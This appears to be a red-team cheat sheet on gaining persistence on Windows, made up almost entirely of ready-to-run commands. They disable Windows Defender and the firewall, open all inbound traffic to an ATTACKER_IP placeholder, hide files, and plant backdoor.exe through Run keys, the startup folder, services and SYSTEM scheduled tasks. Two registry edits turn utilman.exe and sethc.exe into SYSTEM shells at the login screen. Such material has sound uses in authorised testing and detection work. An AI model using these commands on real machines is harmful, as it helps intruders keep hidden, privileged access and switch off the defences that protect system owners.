# Windows - Persistence

# Windows - Persistence

## Summary

- [Tools](about:blank#tools)
- [Disable Windows Defender](about:blank#disable-windows-defender)
- [Disable Windows Firewall](about:blank#disable-windows-firewall)
- [Userland](about:blank#userland)
    - [Registry](about:blank#registry)
    - [Startup](about:blank#startup)
    - [Scheduled Task](about:blank#scheduled-task)
- [Elevated](about:blank#elevated)
    - [HKLM](about:blank#hklm)
    - [Services](about:blank#services)
    - [Scheduled Task](about:blank#scheduled-task)
    - [RDP Backdoor](about:blank#rdp-backdoor)
- [References](about:blank#references)

## Tools

- [SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r](https://github.com/fireeye/SharPersist)

## Disable Windows Defender

    sc config WinDefend start= disabledsc stop WinDefendSet-MpPreference -DisableRealtimeMonitoring $true

## Disable Windows Firewall

    Netsh Advfirewall show allprofilesNetSh Advfirewall set allprofiles state off# ip whitelistingNew-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP

## Userland

Set a file as hidden

    attrib +h c:\autoexec.bat

### Registry

Create a REG_SZ value in the Run key within HKCU.

    Value name:  BackdoorValue data:  C:\Users\Rasta\AppData\Local\Temp\backdoor.exe

Using SharPersist

    SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m addSharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add -o envSharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "logonscript" -m add

### Startup

Create a batch script in the user startup folder.

    PS C:\> gc C:\Users\Rasta\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.batstart /b C:\Users\Rasta\AppData\Local\Temp\backdoor.exe

Using SharPersist

    SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m add

### Scheduled Task

    PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"PS C:\> $T = New-ScheduledTaskTrigger -AtLogOn -User "Rasta"PS C:\> $P = New-ScheduledTaskPrincipal "Rasta"PS C:\> $S = New-ScheduledTaskSettingsSetPS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $SPS C:\> Register-ScheduledTask Backdoor -InputObject $D

Using SharPersist

    # Add to a current scheduled taskSharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add# Add new taskSharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m addSharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly

## Windows Service

Using SharPersist

    SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add

## Elevated

### HKLM

Similar to HKCU. Create a REG_SZ value in the Run key within HKLM.

    Value name:  BackdoorValue data:  C:\Windows\Temp\backdoor.exe

### Services

Create a service that will start automatically or on-demand.

    PS C:\> New-Service -Name "Backdoor" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -Description "Nothing to see here."

### Scheduled Tasks

Scheduled Task to run as SYSTEM, everyday at 9am.

    PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Windows\Temp\backdoor.exe"PS C:\> $T = New-ScheduledTaskTrigger -Daily -At 9amPS C:\> $P = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel HighestPS C:\> $S = New-ScheduledTaskSettingsSetPS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $SPS C:\> Register-ScheduledTask Backdoor -InputObject $D

### RDP Backdoor

### utilman.exe

At the login screen, press Windows Key+U, and you get a cmd.exe window as SYSTEM.

    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f

### sethc.exe

Hit F5 a bunch of times when you are at the RDP login screen.

    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f

## References

- [A view of persistence - Rastamouse](https://rastamouse.me/2018/03/a-view-of-persistence/)
- [Windows Persistence Commands - Pwn Wiki](http://pwnwiki.io/#!persistence/windows/index.md)
- [SharPersist Windows Persistence Toolkit in C - Brett Hawkins](http://www.youtube.com/watch?v=K7o9RSVyazo)